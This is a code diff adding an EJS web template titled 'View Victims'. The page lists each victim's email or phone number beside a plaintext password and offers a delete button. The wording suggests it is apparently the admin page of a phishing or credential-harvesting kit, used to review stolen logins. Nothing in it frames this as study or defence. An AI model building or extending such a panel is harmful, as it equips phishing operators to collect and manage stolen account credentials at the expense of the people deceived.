@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Victims</title>
+</head>
+<body>
+    <h1>Victim Details</h1>
+    <ul>
+        <% victims.forEach((victim) => { %>
+            <li>
+                Email/Number: <%= victim.emailOrNumber %>, Password: <%= victim.password %>
+                <form action="/delete-victim" method="POST" style="display:inline;">
+                    <input type="hidden" name="id" value="<%= victim._id %>">
+                    <button type="submit">Delete</button>
+                </form>
+            </li>
+        <% }); %>
+    </ul>
+</body>
+</html>
